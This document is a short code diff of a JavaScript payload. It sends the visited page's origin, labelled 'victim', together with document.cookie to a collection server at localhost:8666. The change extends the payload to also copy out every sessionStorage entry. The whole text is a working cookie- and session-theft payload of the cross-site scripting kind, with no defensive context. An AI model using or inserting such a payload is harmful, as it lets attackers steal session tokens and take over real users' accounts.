@@ -1,6 +1,9 @@
 fetch("http://localhost:8666/", {
   method: "POST", headers: {
     'Content-Type': 'application/json'
-    // 'Content-Type': 'application/x-www-form-urlencoded',
-  }, body: JSON.stringify({ victim: window.location.href, cookies: document.cookie })
+  }, body: JSON.stringify({
+    victim: window.location.origin,
+    cookies: document.cookie,
+    sessionStorage: Object.getOwnPropertyNames(sessionStorage).reduce((o, k) => { o[k] = sessionStorage.getItem(k); return o; }, {})
+  })
 })
